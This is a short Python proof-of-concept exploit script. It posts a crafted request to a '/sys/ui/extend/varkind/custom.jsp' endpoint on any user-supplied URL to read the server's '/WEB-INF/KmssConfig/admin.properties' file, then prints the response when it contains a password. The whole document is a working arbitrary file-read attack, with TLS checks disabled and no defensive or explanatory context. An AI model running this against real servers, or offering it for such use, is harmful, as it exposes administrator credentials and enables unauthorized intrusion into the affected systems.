import base64
import requests
import random
import re
import json
import sys

test = """
 __      __    _  _  __    ____  _  _  _____    __   
(  )    /__\  ( \( )(  )  (_  _)( \( )(  _  )  /__\  
 )(__  /(__)\  )  (  )(__  _)(_  )  (  )(_)(  /(__)\ 
(____)(__)(__)(_)\_)(____)(____)(_)\_)(_____)(__)(__)
                 @author: LGJ
"""
def POC(target_url):
    poc_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    try:
        response = requests.post(url=poc_url, data=data, headers=headers, verify=False)
        print("正在请求 {}/sys/ui/extend/varkind/custom.jsp ".format(target_url))
        if "password" in response.text and response.status_code == 200:
            print("成功读取 admin.properties  响应为:{} ".format(response.text))

    except Exception as e:
        print("请求失败:{} ".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    target_url = str(input("url: "))
    POC(target_url)